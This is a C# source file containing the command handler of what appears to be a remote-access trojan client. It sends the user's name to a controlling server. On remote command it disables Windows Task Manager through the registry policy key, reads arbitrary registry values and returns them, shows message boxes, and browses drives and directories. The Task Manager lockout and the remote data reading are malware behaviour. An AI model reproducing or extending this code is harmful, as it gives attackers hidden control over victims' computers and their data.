
using Microsoft.Win32;
using System.Text;

namespace Client.Client
{
    public class CommandHandler
    {
        public static bool SendName()
        {
            Main.socketClient.GetServerSocket().Send(Encoding.ASCII.GetBytes("<CMD=NAME>" + WindowsHelper.GetUsername() + "<EOF>"));
            return true;
        }

        public static void ParseData(string data)
        {
            string tempString = data.Replace("<EOF>", "");

            if (tempString.StartsWith("<CMD=MSGBOX>"))
            {
                tempString = tempString.Replace("<CMD=MSGBOX>", "");
                Main.uiRequests.Request(tempString, RequestUI.RequestType.UI_SHOW_MESSAGEBOX);
            }
            else if (tempString.StartsWith("<PING>"))
            {
                Main.socketClient.GetServerSocket().Send(Encoding.ASCII.GetBytes(tempString));
            }
            else if (tempString.StartsWith("<SET-TASKMGR>"))
            {
                string value = tempString.Split(">")[1];
                const string keyPath = @"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
                WindowsHelper.WriteRegistryKey(keyPath, RegistryValueKind.DWord, "DisableTaskMgr", value, true);
            }
            else if (tempString.StartsWith("<GET-REGKEY>"))
            {
                tempString = tempString.Replace("<GET-REGKEY>", "");
                string[] split = tempString.Split("<SPLIT>");
                string returnString = WindowsHelper.ReadRegistryKey(split[0], split[1]);
                Main.socketClient.GetServerSocket().Send(Encoding.ASCII.GetBytes("<GET-REGKEY>" + returnString));
            }
            else if (tempString.StartsWith("<SHUTDOWN-CLIENT>"))
            {
                SocketClient.bShouldRun = false;
                Main.socketClient.GetServerSocket().Disconnect(false);
                Main.socketClient.GetServerSocket().Close();
                Application.Exit();
            }

            if (tempString.StartsWith("<REQUEST-DRIVES>"))
            {
                FileManager.LoadDrives();
            }
            if (tempString.StartsWith("<REQUEST-DIRS>"))
            {
                tempString = tempString.Replace("<REQUEST-DIRS>", "");

                FileManager.LoadDirectories(tempString);
            }
        }

    }
}
